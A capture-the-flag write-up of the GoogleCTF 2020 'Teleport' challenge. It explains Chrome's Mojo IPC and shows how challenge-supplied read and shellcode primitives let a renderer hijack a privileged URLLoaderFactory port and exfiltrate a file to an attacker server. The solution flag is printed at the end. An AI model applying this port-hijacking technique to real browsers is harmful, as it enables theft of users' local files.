# Challenge description

```
Teleport

Please write a full-chain exploit for Chrome. The flag is at /home/user/flag.
Maybe there's some way to tele<port> it out of there?
```

* Category: sandbox
* Points: 474
* Solves: 2

# Introduction

This challenge is from the sandbox category of GoogleCTF 2020. The challenge
explores what can be done from within the sandbox. Often the objective in this
situation is to fully *escape* the sandbox, i.e getting code execution
*outside* of the sandbox. However we may not have all the required primitives
available to accomplish this. For example: what can be done from a compromised
renderer with only the ability to read memory from another process? The
challenge is based on the p0 blog post "Escaping the Chrome Sandbox with RIDL"

## Chromium Processes

Chrome consists of several different processes. For this write-up we need to
look at three of them, the Browser, the Renderer and the Network Service.

Firstly the *renderer* process is responsible for rendering a webpage. This
means it control anything inside of the tab where a website is displayed. For
example it can run arbitrary javascript provided by a web page.

However for the renderer to do something useful, it does need access to the
more basic primitives. For example loading a webpage of course requires opening
a socket and sending and receiving data on it. To do the this the renderer
needs to communicate with the browser and network process.

Secondly the browser process handles everything outside of a tab. This is
running outside of the sandbox and has full access to the system. And lastly
the network process is responsible for fetching resources over the internet.

## Communication

As mentioned these processes need to communicate with one another. The default
mechanism for this is called `Mojo`. With Mojo we can define interfaces for
processes to communicate with. Under the hood these interfaces are identified
by a `Node` and `Port`. These are 128-bit secret random numbers that are
required to send commands to the interface using Mojo. The Node can be seen as
a process identifier and the Port as the interface identifier. These secrets
imply that not all interfaces are created equal; and indeed, some interfaces
have more privileges than others.

In this challenge Chrome is started with `--enable-blink-features=MojoJS` this
enables Mojo bindings from javascript. This allows us easy access to all the
interfaces exposed by the browser. Note that this does not give any additional
privileges by itself.

# Provided Primitives

The challenge gives us two primitives, both are fairly simple to use:

## Code execution

The first primitive simulates having code execution in a renderer:
```cpp
#include <sys/mman.h>
void Mojo::rce(DOMArrayBuffer* shellcode) {
  size_t sz = shellcode->ByteLengthAsSizeT();
  sz += 4096;
  sz &= ~(4096llu-1);
  void *mm = mmap(0, sz, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
  if (mm == MAP_FAILED) {
    LOG(ERROR) << "mmap failed: " << strerror(errno);
    return;
  }
  memcpy(mm, shellcode->Data(), shellcode->ByteLengthAsSizeT());
  void (*fn)(void) = (void (*)(void)) mm;
  fn();
}
```

This means we can easily execute shellcode in the renderer process from
javascript, for example:

```javascript
let ab = new ArrayBuffer(0x1000);
let v8 = new Uint8Array(ab);
v8.set([0xcc, 0xc3]);
```
To break when we have a debugger attached and then return and continue.

## Pwn Interface

The challenge also defines a `Pwn` interface in `pwn.mojom`.
```
module content.mojom;

interface Pwn {
  This() => (uint64 val);
  PtrAt(uint64 addr) => (uint64 val);
};
```

And registers this interface in `render_process_host_impl.cc`
```cpp
registry->AddInterface(base::BindRepeating(&Pwn::Create));
```

Combined this means we can access this interface from the renderer process. The
two methods are defined in `pwn.cc`:

```cpp
void Pwn::This(ThisCallback callback) {
  std::move(callback).Run((uint64_t) this);
}

void Pwn::PtrAt(uint64_t addr, PtrAtCallback callback) {
  std::move(callback).Run(*(uint64_t*) addr);
}
```

Thus we can leak the `this` pointer, to provide a starting point in the
presence of ASLR and then arbitrary data 8 bytes at a time from any address we
specify. Quite a powerful leak primitive, but we can't corrupt any memory in
the browser process to divert control flow with these primitives.

# Exploitation

We can read memory from the browser process, so we should be able to leak
arbitrary port names. Then with these port names we can inject messages in
privileged Mojo connections.

As is well described by @\_tsuro in the p0 blog post "Escaping the Chrome
Sandbox with RIDL", The `URLLoaderFactory` is the interface responsible for
fetching network resources. If we create a URLLoaderFactory in the renderer it
won't be able to send off arbitrary files over the network, but there is an
URLLoaderFactory in the Browser process which has additional privileges. These
additional privileges allow it to access arbitrary files. Thus if we can leak
the port name of this URLLoaderFactory we can connect to it from the renderer
process and send the flag to a remote server.

## Leaking a privileged URLLoaderFactory

One privileged URLLoaderFactory can be found in the browser process by
following a chain of pointers. First we can find the global
`SystemNetworkContextManager` at a fixed address relative to a `vtable` entry
of the `this` pointer we leak.

Then within this SystemNetworkContextManager we find an UrlLoaderFactory. This
eventually leads us to a Mojohandle. The following slightly cleaned `gdb` dump
shows how the handle is embeddin in the URLLoaderFactory.

```
> p &_ZN12_GLOBAL__N_132g_system_network_context_managerE.url_loader_factory_
(mojo::Remote<network::mojom::URLLoaderFactory> *) 0x37211ecfcd60

> p ((mojo::Remote<network::mojom::URLLoaderFactory> *) 0x37211ecfcd60).internal_state_.endpoint_client_
<mojo::InterfaceEndpointClient*, 0, false> = {
  __value_ = 0x3721204cbba0
}

> p ((mojo::InterfaceEndpointClient*)0x3721204cbba0).controller_
(mojo::InterfaceEndpointController *) 0x372120400a20

> p ((mojo::internal::MultiplexRouter::InterfaceEndpoint *) 0x372120400a20).router_.connector_.message_pipe_
<mojo::Handle> = {
  value_ = 0x5d1
}
```

Now similarly there exists another global object: `Core`. In this we can find
the `HandleTable`, a mapping from all active handles to their Ports. We parse
this table to get the remote port identifier of the privileged
URLLoaderFactory, which lives in the network process.

We can use javascript bindings to connect to the Pwn interface:

```javascript
let pwnPtr  = new content.mojom.PwnPtr;
let pwnReq  = new mojo.makeRequest(pwnPtr);
Mojo.bindInterface(content.mojom.Pwn.name, pwnReq.handle, "process");
```

Then call the methods on `pwnPtr` to implement the leak:

```javascript
await pwnPtr.ptrAt(ptr).then(val  => { return val.val; });
await pwnPtr.this().then(ptr => { return ptr.val; });
```

We can then get the handle by translating the above pointer walk into offsets
and walking the HandleTable.

## Patching an unprivileged URLLoaderFactory

We can create a new URLLoaderFactory in the renderer:

```javascript
let UrlLoaderPtr = new network.mojom.URLLoaderPtr;
let UrlLoaderReq = mojo.makeRequest(UrlLoaderPtr);

let UrlLoaderClientPtr = new network.mojom.URLLoaderClientPtr;
let UrlLoaderClientReq = mojo.makeRequest(UrlLoaderClientPtr);

let UrlLoaderFactoryPtr = new network.mojom.URLLoaderFactoryPtr();
let UrlLoaderFactoryReq = mojo.makeRequest(UrlLoaderFactoryPtr);
// Create an UrlLoader and connect it to the browser
Mojo.bindInterface(network.mojom.URLLoaderFactory.name,
    UrlLoaderFactoryReq.handle, "process");
```

This asks the Browser process to set us up with a new connection to an
URLLoaderFactory. This URLLoaderFactory lives in the network process. However
this is an unprivileged endpoint. To connect to the privileged endpoint we will
need to use the shellcode primitive to patch memory.

1. Find the handle of the URLLoaderFactory
2. Lookup the handle to find the Dispatcher, which includes the peer port of
   this Mojo connection. Then patch in the new port names we got earlier.

Note that from the shellcode we can access the backing storage of the array
buffer, so it's easy to get data in and out of the shellcode

For the first step: before creating the URLLoaderFactory parse all the active
handles in the HandleTable. Then create and bind the URLLoaderFactory and then
parse the handles again.  There should then be one new handle, this one belongs
to the URLLoaderFactory.

We find this handle in the HandleTable, there we can change it's peer port to
the port we found earlier, thus we now have a direct connection to a privileged
URLLoaderFactory!

# Making a request

All that's left to do is to use our privileged URLLoaderFactory to send a POST
request to a server we control with the file "/home/user/flag". Then we get the
flag delivered to our server :)

# References

1. The idea behind this challenge: [Escaping chrome sandbox with RIDL](https://googleprojectzero.blogspot.com/2020/02/escaping-chrome-sandbox-with-ridl.html)
2. Mojo introduction: [Intro to Mojo & Services](https://chromium.googlesource.com/chromium/src/+/master/docs/mojo_and_services.md) (And every single README.md in the mojo/ folder)
3. Information on the URLLoaderFactory : [URLLoader 101](https://docs.google.com/presentation/d/1ku7pkh09h6sQ6epudsVvHehRzvanAU7ckzfiVvMoljo/edit#slide=id.g84d512bbb7_0_78)

# Flag:

When the browser visits our website we get the flag in a post request:
`CTF{hi_scotty_plz_teleport_kthxbye}`
